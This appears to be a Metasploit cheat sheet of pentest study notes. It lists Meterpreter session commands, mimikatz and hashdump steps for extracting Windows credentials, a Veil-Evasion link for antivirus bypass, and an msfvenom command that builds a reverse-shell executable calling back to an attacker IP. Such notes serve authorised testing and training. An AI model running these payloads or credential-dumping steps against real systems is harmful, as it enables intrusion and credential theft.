# METASPLOIT

* [Metasploit Unleashed](https://www.offensive-security.com/metasploit-unleashed/) - the ultimate guide to the Metasploit Framework
* [Veil-Evasion](https://github.com/Veil-Framework/Veil-Evasion/) - generate metasploit payloads that bypass anti-virus solutions

Starting
--------
```
service postgresql start
msfdb init
msfconsole
```

Useful Metasploit Console Commands
----------------------------------
* [MSFconsole Core Commands](https://www.offensive-security.com/metasploit-unleashed/msfconsole-commands/)  
```
jobs
sessions -i 1
set session 1
```

Useful Meterpreter Commands
---------------------------
```
wdigest (
sysinfo
exit/quit
download/upload (use C:\\)
edit
getpid
geuid
ps
kill
execute
migrate
search -f network-secret.txt
shell
```
* Load mimikatz (needs SYSTEM privs; better migrate to 64bit process): `load mimikatz`, then use `msv`, `kerberos`, `wdigest` for extracting passwords.  
* Post-exploitation module: `run winenum` script.  
* Windows hashes: `run post/windows/gather/smart_hashdump`  

* [Web Delivery explained](https://www.offensive-security.com/metasploit-unleashed/web-delivery/) //tip: check if there's port added in the payload URL

msfvenom
--------

* [How to use msfvenom](https://github.com/rapid7/metasploit-framework/wiki/How-to-use-msfvenom)

Typical Windows exe payload:

`msfvenom -p windows/meterpreter/reverse_tcp lhost=[Attacker's IP] lport=4444 -f exe -o /tmp/my_payload.exe`  

As an example, the payload can be delivered via webserver. Then `use exploit/multihandler`, set appropriate payload, IPs, ports etc.
